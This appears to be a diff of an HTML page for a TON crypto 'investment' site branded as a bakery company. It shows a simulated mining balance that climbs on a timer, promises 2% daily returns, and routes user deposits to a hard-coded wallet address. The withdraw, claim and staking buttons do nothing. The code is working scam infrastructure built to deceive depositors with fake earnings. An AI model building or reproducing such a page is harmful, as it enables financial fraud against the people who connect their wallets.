@@ -3,48 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YESMAN PANADERÍA S.A.S</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tonconnect-ui/2.0.9/tonconnect-ui.min.js"></script>
+    <title>Yesman Panadería S.A.S</title>
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+
     <style>
-        body { background: #000; color: #fff; text-align: center; padding: 20px; font-family: sans-serif; }
-        .card { background: #111; border: 2px solid #FFD700; border-radius: 25px; padding: 30px; max-width: 400px; margin: auto; }
-        .btn { padding: 20px; width: 100%; background: #FFD700; color: #000; border: none; border-radius: 15px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
-        .balance { font-size: 32px; color: #FFD700; margin: 20px 0; font-family: monospace; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0b0f1a; color: white; }
+        .container { max-width: 430px; margin: auto; padding: 15px; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .logo { font-weight: bold; font-size: 18px; color: #FFD700; }
+        .level { background: #1E293B; padding: 5px 10px; border-radius: 10px; font-size: 12px; border: 1px solid #FFD700; }
+        .card { background: #131C2E; padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid #1e293b; }
+        .section-title { font-size: 13px; color: #94A3B8; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .balance { font-size: 16px; margin-bottom: 8px; font-family: monospace; }
+        .pan-highlight { color: #FFD700; font-weight: bold; font-size: 22px; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 12px; margin-bottom: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; color: white; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .blue { background: #2563EB; }
+        .green { background: #16A34A; }
+        .orange { background: #F59E0B; }
+        .red { background: #DC2626; }
+        .purple { background: #7C3AED; }
+        .gray { background: #334155; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: none; margin-bottom: 10px; background: #1E293B; color: white; box-sizing: border-box; }
+        .footer { text-align: center; font-size: 11px; color: #64748B; margin-top: 20px; padding-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>YESMAN PANADERÍA S.A.S</h3>
-        <div class="balance" id="b">0.000002052</div>
-        <button class="btn" id="btnConnect">VINCULAR CUALQUIER BILLETERA</button>
-        <p id="info" style="margin-top:15px; font-size:12px; color:#888;">Cargando sistema...</p>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">YESMAN PANADERÍA</div>
+        <div class="level" id="statusLabel">🔴 Desconectado</div>
     </div>
 
-    <script>
-        // Minería visual (Instrucción del usuario)
-        let val = 0.000002052;
-        setInterval(() => { val += 0.000000001; document.getElementById('b').innerText = val.toFixed(9); }, 1000);
+    <div class="card" style="border-color: #2563EB;">
+        <div id="walletAddress" style="font-size: 11px; color: #94A3B8; margin-bottom: 10px; overflow: hidden; text-overflow: ellipsis;">Billetera no vinculada</div>
+        <button class="blue" id="btnConnect">🔗 Conectar Wallet Web3</button>
+    </div>
 
-        function iniciar() {
-            // Verificamos si la nueva librería cargó
-            if (typeof TONConnectUI === 'undefined') {
-                document.getElementById('info').innerText = "❌ Bloqueo detectado. Intenta con WiFi o Chrome.";
-                return;
-            }
+    <div class="card">
+        <div class="section-title">Dashboard de Inversión</div>
+        <div class="balance">Producción: <span id="bLive" class="pan-highlight">0.000002052</span> <small>$PAN</small></div>
+        <div class="balance">Red de Inversión: <span style="color:#16A34A">2% Diario</span></div>
+    </div>
 
-            document.getElementById('info').innerText = "✅ LISTO PARA CONECTAR";
-            document.getElementById('info').style.color = "#28a745";
+    <div class="card">
+        <div class="section-title">Inversión Activa</div>
+        <input type="number" id="amount" placeholder="Monto en TON (Ej: 1)" value="1">
+        <button class="green" id="btnDeposit" disabled>🚀 Activar Plan (Depósito)</button>
+        <button class="gray">🔁 Reinvertir Ganancias</button>
+    </div>
 
-            const ui = new TONConnectUI.TonConnectUI({
-                manifestUrl: 'https://yesmanbakery.github.io/yesman-app/tonconnect-manifest.json'
-            });
+    <div class="card">
+        <div class="section-title">Operaciones Financieras</div>
+        <button class="orange">🟠 Reclamar $PAN</button>
+        <button class="purple">🟣 Staking Premium</button>
+        <button class="red">🔴 Retirar Fondos</button>
+    </div>
 
-            document.getElementById('btnConnect').onclick = () => {
-                ui.openModal().catch(e => alert("Error: " + e));
-            };
+    <div class="card">
+        <div class="section-title">Comunidad y Ayuda</div>
+        <a href="https://t.me/+5hDsdH8gffpkNjUx" target="_blank" style="text-decoration:none;">
+            <button class="blue">👥 Grupo Oficial Telegram</button>
+        </a>
+        <a href="https://t.me/MANDON1" target="_blank" style="text-decoration:none;">
+            <button class="gray">🛟 Soporte Técnico</button>
+        </a>
+    </div>
+
+    <div class="footer">
+        Yesman Panadería S.A.S © 2026<br>Inversión Digital $PAN
+    </div>
+</div>
+
+<script>
+    // 1. Lógica de Minería (9 decimales como pediste)
+    let balance = 0.000002052;
+    setInterval(() => {
+        balance += 0.000000001;
+        document.getElementById('bLive').innerText = balance.toFixed(9);
+    }, 1000);
+
+    // 2. Inicialización de TON Connect UI
+    const tonConnectUI = new TONConnectUI.TonConnectUI({
+        manifestUrl: 'https://yesmanbakery.github.io/yesman-app/tonconnect-manifest.json',
+        buttonRootId: null // Lo manejamos nosotros manualmente
+    });
+
+    // 3. Botón Conectar
+    const btnConnect = document.getElementById('btnConnect');
+    const btnDeposit = document.getElementById('btnDeposit');
+    const walletText = document.getElementById('walletAddress');
+    const statusLabel = document.getElementById('statusLabel');
+
+    btnConnect.onclick = async () => {
+        try {
+            await tonConnectUI.openModal();
+        } catch (e) {
+            alert("Error al abrir selector de billeteras.");
         }
+    };
 
-        window.onload = iniciar;
-    </script>
+    // 4. Escuchar cambios en la Wallet
+    tonConnectUI.onStatusChange(wallet => {
+        if (wallet) {
+            const addr = wallet.account.address;
+            walletText.innerText = "Conectado: " + addr.substring(0, 6) + "..." + addr.substring(addr.length - 4);
+            btnConnect.innerText = "✅ Billetera Vinculada";
+            btnConnect.classList.replace('blue', 'gray');
+            statusLabel.innerText = "🟢 En Línea";
+            statusLabel.style.color = "#16A34A";
+            btnDeposit.disabled = false;
+        } else {
+            walletText.innerText = "Billetera no vinculada";
+            btnConnect.innerText = "🔗 Conectar Wallet Web3";
+            btnConnect.classList.replace('gray', 'blue');
+            statusLabel.innerText = "🔴 Desconectado";
+            statusLabel.style.color = "white";
+            btnDeposit.disabled = true;
+        }
+    });
+
+    // 5. Lógica de Depósito (Inversión)
+    btnDeposit.onclick = async () => {
+        const monto = document.getElementById('amount').value || "1";
+        // Convertir a Nanotons (1 TON = 1,000,000,000 Nanotons)
+        const amountInNano = (parseFloat(monto) * 1000000000).toString();
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [{
+                address: "UQDl39VhMg-Hwa898TA-WHOBgGkGQFvBMftpuDm4yyTCdfZ2",
+                amount: amountInNano
+            }]
+        };
+
+        try {
+            await tonConnectUI.sendTransaction(transaction);
+            alert("¡Solicitud de inversión enviada a tu billetera!");
+        } catch (e) {
+            alert("Transacción cancelada.");
+        }
+    };
+</script>
+
 </body>
 </html>
